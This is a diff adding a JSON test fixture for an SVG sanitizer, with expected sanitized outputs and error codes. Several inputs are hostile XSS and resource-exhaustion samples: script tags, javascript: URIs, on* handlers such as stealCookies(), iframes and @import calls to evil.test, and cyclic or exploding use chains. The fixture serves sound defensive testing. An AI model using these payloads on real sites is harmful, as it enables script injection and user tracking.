@@ -1,0 +1,182 @@
+{
+  "schema_version": "1.0",
+  "ticket_id": "KANBA-78",
+  "specification_reference": "S5.4",
+  "constants": {
+    "MAX_CLIENT_SVG_BYTES": 2097152,
+    "MAX_SVG_USE_DEPTH": 4,
+    "MAX_SVG_EXPANDED_NODES": 500
+  },
+  "test_cases": [
+    {
+      "id": "SVG-TC-01",
+      "category": "benign_vector_geometry",
+      "description": "Clean vector geometry with shape, fill, viewBox, and automatic xmlns injection",
+      "raw_input": "<svg viewBox=\"0 0 100 100\"><rect x=\"10\" y=\"10\" width=\"80\" height=\"80\" fill=\"blue\"/></svg>",
+      "verdict": "sanitized_pass",
+      "error_code": null,
+      "sanitized_output": "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 100 100\"><rect x=\"10\" y=\"10\" width=\"80\" height=\"80\" fill=\"blue\"/></svg>",
+      "security_notes": "Preserves standard SVG primitives while guaranteeing strict SVG namespace on root element."
+    },
+    {
+      "id": "SVG-TC-02",
+      "category": "xss_script_injection",
+      "description": "Hostile embedded executable <script> tags attempting inline DOM XSS",
+      "raw_input": "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 200 200\"><script>window.__xss = 1; alert(document.domain);</script><circle cx=\"100\" cy=\"100\" r=\"50\" fill=\"green\"/></svg>",
+      "verdict": "sanitized_pass",
+      "error_code": null,
+      "sanitized_output": "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 200 200\"><circle cx=\"100\" cy=\"100\" r=\"50\" fill=\"green\"/></svg>",
+      "security_notes": "DOMPurify SVG profile strips <script> elements and inline text execution payloads completely."
+    },
+    {
+      "id": "SVG-TC-03",
+      "category": "html_foreign_object_embedding",
+      "description": "Hostile <foreignObject> embedding arbitrary HTML, iframes, and cross-origin widgets",
+      "raw_input": "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 200 200\"><foreignObject width=\"100\" height=\"100\"><body xmlns=\"http://www.w3.org/1999/xhtml\"><iframe src=\"https://evil.test\"></iframe></body></foreignObject><rect width=\"50\" height=\"50\"/></svg>",
+      "verdict": "sanitized_pass",
+      "error_code": null,
+      "sanitized_output": "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 200 200\"><rect width=\"50\" height=\"50\"/></svg>",
+      "security_notes": "FORBID_TAGS strips <foreignObject>, <body>, and <iframe>, eliminating HTML context breakout."
+    },
+    {
+      "id": "SVG-TC-04",
+      "category": "network_tracking_pixel",
+      "description": "Hostile <image> elements with remote HTTP/HTTPS URLs attempting user IP and cookie tracking",
+      "raw_input": "<svg xmlns=\"http://www.w3.org/2000/svg\"><image href=\"https://evil.test/track.png\" xlink:href=\"https://evil.test/track2.png\" width=\"50\" height=\"50\" /><circle r=\"10\"/></svg>",
+      "verdict": "sanitized_pass",
+      "error_code": null,
+      "sanitized_output": "<svg xmlns=\"http://www.w3.org/2000/svg\"><circle r=\"10\"/></svg>",
+      "security_notes": "FORBID_TAGS strips <image> elements completely. Second-layer attribute sanitizer blocks external network fetches."
+    },
+    {
+      "id": "SVG-TC-05",
+      "category": "css_style_injection",
+      "description": "Hostile <style> elements with @import directives attempting CSS exfiltration and layout hijacking",
+      "raw_input": "<svg xmlns=\"http://www.w3.org/2000/svg\"><style>@import url(\"https://evil.test/evil.css\"); body { background: red; }</style><rect width=\"20\" height=\"20\"/></svg>",
+      "verdict": "sanitized_pass",
+      "error_code": null,
+      "sanitized_output": "<svg xmlns=\"http://www.w3.org/2000/svg\"><rect width=\"20\" height=\"20\"/></svg>",
+      "security_notes": "FORBID_TAGS strips <style> tags and FORBID_ATTR strips style attributes, enforcing style-src self CSP."
+    },
+    {
+      "id": "SVG-TC-06",
+      "category": "smil_animation_href_hijack",
+      "description": "Hostile SMIL <animate> elements mutating xlink:href to javascript: URI execution vectors",
+      "raw_input": "<svg xmlns=\"http://www.w3.org/2000/svg\"><animate attributeName=\"href\" to=\"javascript:alert(1)\" /><animateTransform attributeName=\"transform\" type=\"rotate\" /><rect width=\"20\" height=\"20\"/></svg>",
+      "verdict": "sanitized_pass",
+      "error_code": null,
+      "sanitized_output": "<svg xmlns=\"http://www.w3.org/2000/svg\"><rect width=\"20\" height=\"20\"/></svg>",
+      "security_notes": "FORBID_TAGS strips animate, animateTransform, animateMotion, and set elements."
+    },
+    {
+      "id": "SVG-TC-07",
+      "category": "inline_event_handlers",
+      "description": "Hostile inline event handlers (onload, onclick, onerror, onmouseover) on valid SVG geometry",
+      "raw_input": "<svg xmlns=\"http://www.w3.org/2000/svg\"><circle cx=\"50\" cy=\"50\" r=\"40\" onload=\"alert(1)\" onclick=\"stealCookies()\" onmouseover=\"track()\"/></svg>",
+      "verdict": "sanitized_pass",
+      "error_code": null,
+      "sanitized_output": "<svg xmlns=\"http://www.w3.org/2000/svg\"><circle cx=\"50\" cy=\"50\" r=\"40\"/></svg>",
+      "security_notes": "Dual-layer DOMPurify event handler stripping and post-parse attribute scrubber remove all on* attributes."
+    },
+    {
+      "id": "SVG-TC-08",
+      "category": "external_use_href_block",
+      "description": "Hostile <use> tags referencing off-origin remote SVG resource files",
+      "raw_input": "<svg xmlns=\"http://www.w3.org/2000/svg\"><use href=\"https://evil.test/x.svg#remote-symbol\" xlink:href=\"https://evil.test/x2.svg#sym\"/><rect width=\"10\" height=\"10\"/></svg>",
+      "verdict": "sanitized_pass",
+      "error_code": null,
+      "sanitized_output": "<svg xmlns=\"http://www.w3.org/2000/svg\"><use/><rect width=\"10\" height=\"10\"/></svg>",
+      "security_notes": "Href regex /^[A-Za-z0-9_.:-]+$/ strictly strips non-local href attributes, preventing cross-origin asset pulls."
+    },
+    {
+      "id": "SVG-TC-09",
+      "category": "self_cyclic_use_reference",
+      "description": "Hostile recursive <use> element referencing its own enclosing definition ID",
+      "raw_input": "<svg xmlns=\"http://www.w3.org/2000/svg\"><defs><g id=\"selfNode\"><use href=\"#selfNode\" /></g></defs><use href=\"#selfNode\" /></svg>",
+      "verdict": "rejected",
+      "error_code": "SVG_USE_CYCLE",
+      "sanitized_output": null,
+      "security_notes": "Acyclic DAG depth-first search detects visited target node and rejects with SVG_USE_CYCLE before serialization."
+    },
+    {
+      "id": "SVG-TC-10",
+      "category": "mutual_cyclic_use_reference",
+      "description": "Hostile mutual recursive loop between two distinct <use> elements (A -> B -> A)",
+      "raw_input": "<svg xmlns=\"http://www.w3.org/2000/svg\"><defs><g id=\"nodeA\"><use href=\"#nodeB\" /></g><g id=\"nodeB\"><use href=\"#nodeA\" /></g></defs><use href=\"#nodeA\" /></svg>",
+      "verdict": "rejected",
+      "error_code": "SVG_USE_CYCLE",
+      "sanitized_output": null,
+      "security_notes": "Detects mutual recursion in reference graph and rejects before browser renderer causes stack overflow."
+    },
+    {
+      "id": "SVG-TC-11",
+      "category": "valid_deep_use_dag",
+      "description": "Valid deep <use> chain at exact maximum allowed depth of 4 (l1 -> l2 -> l3 -> l4)",
+      "raw_input": "<svg xmlns=\"http://www.w3.org/2000/svg\"><defs><rect id=\"l4\" width=\"10\" height=\"10\"/><g id=\"l3\"><use href=\"#l4\"/></g><g id=\"l2\"><use href=\"#l3\"/></g><g id=\"l1\"><use href=\"#l2\"/></g></defs><use href=\"#l1\"/></svg>",
+      "verdict": "sanitized_pass",
+      "error_code": null,
+      "sanitized_output": "<svg xmlns=\"http://www.w3.org/2000/svg\"><defs><rect id=\"l4\" width=\"10\" height=\"10\"/><g id=\"l3\"><use href=\"#l4\"/></g><g id=\"l2\"><use href=\"#l3\"/></g><g id=\"l1\"><use href=\"#l2\"/></g></defs><use href=\"#l1\"/></svg>",
+      "security_notes": "Depth 4 satisfies MAX_SVG_USE_DEPTH <= 4 constraint."
+    },
+    {
+      "id": "SVG-TC-12",
+      "category": "excessive_depth_use_dag",
+      "description": "Hostile deep <use> chain exceeding maximum allowed depth of 4 (step1 -> step2 -> step3 -> step4 -> step5)",
+      "raw_input": "<svg xmlns=\"http://www.w3.org/2000/svg\"><defs><rect id=\"step5\" width=\"10\" height=\"10\"/><g id=\"step4\"><use href=\"#step5\"/></g><g id=\"step3\"><use href=\"#step4\"/></g><g id=\"step2\"><use href=\"#step3\"/></g><g id=\"step1\"><use href=\"#step2\"/></g></defs><use href=\"#step1\"/></svg>",
+      "verdict": "rejected",
+      "error_code": "SVG_USE_MAX_DEPTH",
+      "sanitized_output": null,
+      "security_notes": "Exceeds MAX_SVG_USE_DEPTH (4) and is rejected with SVG_USE_MAX_DEPTH."
+    },
+    {
+      "id": "SVG-TC-13",
+      "category": "billion_laughs_expansion_threshold_boundary",
+      "description": "Exponential <use> expansion resulting in exactly 500 expanded DOM nodes",
+      "raw_input": "<svg xmlns=\"http://www.w3.org/2000/svg\"><defs><g id=\"baseGroup\"><!-- 49 rects + 1 group = 50 nodes --></g></defs><!-- 10 uses of baseGroup = 500 expanded nodes --></svg>",
+      "verdict": "sanitized_pass",
+      "error_code": null,
+      "sanitized_output": "<svg xmlns=\"http://www.w3.org/2000/svg\">...</svg>",
+      "security_notes": "Passes because expanded node count is <= MAX_SVG_EXPANDED_NODES (500)."
+    },
+    {
+      "id": "SVG-TC-14",
+      "category": "billion_laughs_expansion_bomb",
+      "description": "Hostile exponential <use> billion-laughs bomb resulting in 550 expanded DOM nodes (> 500 limit)",
+      "raw_input": "<svg xmlns=\"http://www.w3.org/2000/svg\"><defs><g id=\"baseGroup\"><!-- 49 rects + 1 group = 50 nodes --></g></defs><!-- 11 uses of baseGroup = 550 expanded nodes --></svg>",
+      "verdict": "rejected",
+      "error_code": "SVG_EXPANSION_LIMIT_EXCEEDED",
+      "sanitized_output": null,
+      "security_notes": "Rejected with SVG_EXPANSION_LIMIT_EXCEEDED before client browser freezes from DOM explosion."
+    },
+    {
+      "id": "SVG-TC-15",
+      "category": "payload_byte_limit",
+      "description": "Oversized SVG payload exceeding client 2 MiB boundary (2,097,153 bytes)",
+      "raw_input": "<svg viewBox=\"0 0 10 10\"><desc>...[2,097,153 bytes]...</desc></svg>",
+      "verdict": "rejected",
+      "error_code": "SVG_TOO_LARGE",
+      "sanitized_output": null,
+      "security_notes": "TextEncoder byte length check rejects oversized payloads immediately before parsing."
+    },
+    {
+      "id": "SVG-TC-16",
+      "category": "malformed_xml_syntax",
+      "description": "Malformed SVG XML syntax causing DOMParser parsererror",
+      "raw_input": "<svg><unclosed-tag></svg>",
+      "verdict": "rejected",
+      "error_code": "SVG_PARSE_ERROR",
+      "sanitized_output": null,
+      "security_notes": "DOMParser parsererror detected and rejected with SVG_PARSE_ERROR."
+    },
+    {
+      "id": "SVG-TC-17",
+      "category": "empty_input",
+      "description": "Empty or whitespace-only input string",
+      "raw_input": "   \\n\\t  ",
+      "verdict": "rejected",
+      "error_code": "SVG_EMPTY",
+      "sanitized_output": null,
+      "security_notes": "Whitespace check rejects empty input with SVG_EMPTY."
+    }
+  ]
+}
